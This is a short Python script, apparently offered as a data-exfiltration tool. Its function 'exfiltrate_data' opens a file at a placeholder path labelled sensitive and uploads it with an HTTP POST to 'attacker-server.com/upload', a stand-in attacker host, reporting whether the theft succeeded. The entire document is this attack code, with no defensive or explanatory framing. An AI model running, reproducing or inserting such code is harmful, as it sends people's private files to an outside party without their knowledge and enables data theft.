import os
import requests

def exfiltrate_data(file_path, remote_url):
    with open(file_path, 'rb') as file:
        data = {'file': file}
        response = requests.post(remote_url, files=data)
        if response.status_code == 200:
            print(f"Successfully exfiltrated {file_path}")
        else:
            print(f"Failed to exfiltrate {file_path}")

if __name__ == "__main__":
    file_path = 'C:/path/to/sensitive/file.txt'
    remote_url = 'http://attacker-server.com/upload'
    exfiltrate_data(file_path, remote_url)